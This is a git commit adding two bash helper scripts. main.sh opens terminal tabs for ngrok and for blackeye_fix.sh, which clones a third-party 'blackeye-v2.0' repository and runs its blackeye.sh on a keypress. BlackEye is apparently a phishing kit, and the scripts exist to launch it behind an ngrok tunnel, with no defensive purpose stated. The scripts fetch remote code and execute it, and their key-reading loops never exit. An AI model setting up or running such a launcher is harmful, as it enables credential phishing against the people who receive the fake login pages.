acf085021011629515a556da399b9a2a93431804
theaqueen21 <94680549+theaqueen21@users.noreply.github.com>
2022-05-21 11:58:00 +0430

    Add files via upload

---
+++ blackeye_fix.sh
@@ -0,0 +1,38 @@
+#!/bin/bash
+FINDUSER="${SUDO_USER:-${USER}}"
+echo "Author: theaqueen21"
+echo "							"
+echo "Downloading blackeye2.0"
+echo "							
+							"
+echo "ngrok setup has started in another terminal tab, after this setup simply switch tabs to complete the process"
+echo "
+							"							
+if [ "$FINDUSER" == "root" ];then
+git clone "https://github.com/bhikandeshmukh/blackeye-v2.0"
+echo "
+							"
+sleep 2							
+while true; do
+read -rsn1 input_root
+echo "press Y to run blackeye"
+if [ "$input_root" = "Y" ];then
+cd /$FINDUSER/blackeye-v2.0
+sleep 0.2
+bash blackeye.sh
+fi
+done
+else
+git clone "https://github.com/bhikandeshmukh/blackeye-v2.0"
+sleep 2
+echo "
+							"
+echo "press Y to run blackeye"	
+while true; do						
+read -rsn1 input_user
+if [ "$input_user" = "Y" ];then
+cd /home/$FINDUSER/blackeye-v2.0
+bash blackeye.sh
+fi
+done
+fi
---
+++ main.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+sudo apt-get install gnome-terminal && gnome-terminal --full-screen -- bash ngrok_fix.sh && gnome-terminal --full-screen -- bash blackeye_fix.sh
+
